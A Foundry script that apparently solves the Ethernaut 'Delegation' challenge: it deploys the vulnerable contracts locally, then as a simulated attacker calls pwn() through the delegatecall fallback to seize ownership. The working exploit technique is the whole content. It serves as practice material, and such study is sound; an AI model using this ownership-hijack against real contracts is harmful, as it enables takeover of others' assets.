// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";
import {console} from "forge-std/console.sol";

contract DeployAndAttackDelegation is Script {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    function run() public {
        vm.startPrank(deployer);
        Delegate delegate = new Delegate(deployer);
        Delegation delegation = new Delegation(address(delegate));
        vm.stopPrank();

        console.log("Delegate deployed at:", address(delegate));
        console.log("Delegation deployed at:", address(delegation));
        console.log("Owner: ", delegation.owner());

        vm.startPrank(attacker);
        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Delegate call failed");
        console.log("Delegate call successful");
        console.log("New owner:", delegation.owner());
    }
}
